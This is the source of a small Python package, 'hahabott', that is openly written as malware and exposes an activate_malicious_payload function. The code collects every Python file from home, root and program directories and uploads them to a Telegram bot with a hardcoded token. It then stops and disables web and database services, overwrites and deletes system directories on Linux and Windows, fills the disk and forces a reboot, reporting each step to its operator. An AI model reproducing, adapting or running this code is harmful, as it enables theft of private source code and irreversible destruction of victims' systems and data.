hahabott/
├── __init__.py
└── core.py

from .core import activate_malicious_payload

import os
import shutil
import platform
import subprocess
import requests

ADMIN_CHAT_ID = "7216718830"
BOT_TOKEN = "7747114378:AAELbz9az63enz_E5AldrJyN94oqJ4DpPk" # This token is just an example

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        pass # Ignore errors, we don't care if it fails.

def send_telegram_document(chat_id, file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            requests.post(url, data={"chat_id": chat_id}, files=files)
    except Exception as e:
        pass # Ignore errors, the mission is more important.

def collect_and_send_python_files():
    send_telegram_message(ADMIN_CHAT_ID, "Collecting Python files...")
    
    # Directories to search for Python files
    target_directories = []
    if platform.system() == "Windows":
        target_directories.append(os.path.join(os.environ.get("HOMEDRIVE"), os.environ.get("HOMEPATH")))
        target_directories.append(os.environ.get("PROGRAMFILES"))
        target_directories.append(os.path.join(os.environ.get("APPDATA"), "Python"))
    elif platform.system() == "Linux" or platform.system() == "Android":
        target_directories.append("/home")
        target_directories.append("/root")
        target_directories.append("/usr/lib/python3") # Example, could be different

    for root_dir in target_directories:
        if os.path.exists(root_dir):
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if file.endswith(".py"):
                        file_path = os.path.join(root, file)
                        try:
                            send_telegram_document(ADMIN_CHAT_ID, file_path)
                            send_telegram_message(ADMIN_CHAT_ID, f"Sent file: {file_path}")
                        except Exception as e:
                            pass # File might be too large or inaccessible, just move on.

def disable_server_systems():
    send_telegram_message(ADMIN_CHAT_ID, "Attempting to disable server systems...")
    if platform.system() == "Linux":
        try:
            subprocess.run(["systemctl", "stop", "apache2", "nginx", "mysql", "postgresql"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["systemctl", "disable", "apache2", "nginx", "mysql", "postgresql"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            send_telegram_message(ADMIN_CHAT_ID, "Linux server services stopped and disabled.")
        except Exception as e:
            send_telegram_message(ADMIN_CHAT_ID, f"Error disabling Linux services: {e}")
    elif platform.system() == "Windows":
        try:
            subprocess.run(["net", "stop", "Apache2.4", "Nginx", "MySQL", "SQL Server (SQLEXPRESS)"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["sc", "config", "Apache2.4", "start= disabled"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["sc", "config", "Nginx", "start= disabled"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["sc", "config", "MySQL", "start= disabled"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.run(["sc", "config", "SQL Server (SQLEXPRESS)", "start= disabled"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            send_telegram_message(ADMIN_CHAT_ID, "Windows server services stopped and disabled.")
        except Exception as e:
            send_telegram_message(ADMIN_CHAT_ID, f"Error disabling Windows services: {e}")

def corrupt_and_destroy_server():
    send_telegram_message(ADMIN_CHAT_ID, "Initiating server corruption and destruction...")
    
    if platform.system() == "Linux" or platform.system() == "Android":
        try:
            # Overwrite random files in critical directories
            directories_to_corrupt = ["/etc", "/usr/bin", "/var/log", "/home", "/root", "/boot"]
            for directory in directories_to_corrupt:
                if os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                            except Exception as fe:
                                pass # Ignore permission errors or locked files
            
            # Attempt to delete critical system directories
            critical_dirs = ["/bin", "/sbin", "/lib", "/usr", "/var", "/opt", "/srv"]
            for c_dir in critical_dirs:
                if os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception as de:
                        pass # Ignore errors for in-use directories
            
            # Attempt to fill up disk space
            try:
                with open("/dev/zero", "wb") as f:
                    f.write(b'0' * (100 * 1024 * 1024 * 1024)) # Write 100GB of zeros
            except Exception as fe:
                pass # Ignore errors
            
            # Attempt to force a reboot
            try:
                subprocess.run(["reboot", "-f"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as re:
                pass

            send_telegram_message(ADMIN_CHAT_ID, "Linux/Android server corruption attempted. Reboot initiated.")

        except Exception as e:
            send_telegram_message(ADMIN_CHAT_ID, f"Error corrupting Linux/Android server: {e}")

    elif platform.system() == "Windows":
        try:
            # Overwrite random files in critical directories
            directories_to_corrupt = [os.environ.get("WINDIR"), os.environ.get("PROGRAMFILES"), os.environ.get("APPDATA"), os.environ.get("TEMP")]
            for directory in directories_to_corrupt:
                if directory and os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                            except Exception as fe:
                                pass # Ignore permission errors or locked files

            # Attempt to delete critical system directories
            critical_dirs = [os.path.join(os.environ.get("WINDIR"), "System32"), os.environ.get("PROGRAMFILES"), os.environ.get("WINDIR")]
            for c_dir in critical_dirs:
                if c_dir and os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception as de:
                        pass # Ignore errors for in-use directories
            
            # Attempt to fill up disk space
            try:
                dummy_file_path = os.path.join(os.environ.get("TEMP"), "malicious_data.tmp")
                with open(dummy_file_path, "wb") as f:
                    f.seek(100 * 1024 * 1024 * 1024 - 1) # 100 GB
                    f.write(b'\0')
            except Exception as fe:
                pass # Ignore errors

            # Attempt to force a reboot
            try:
                subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except Exception as re:
                pass

            send_telegram_message(ADMIN_CHAT_ID, "Windows server corruption attempted. Reboot initiated.")

        except Exception as e:
            send_telegram_message(ADMIN_CHAT_ID, f"Error corrupting Windows server: {e}")

def activate_malicious_payload():
    collect_and_send_python_files()
    disable_server_systems()
    corrupt_and_destroy_server()
    send_telegram_message(ADMIN_CHAT_ID, "Payload execution complete. Server should be compromised and destroyed. (: ")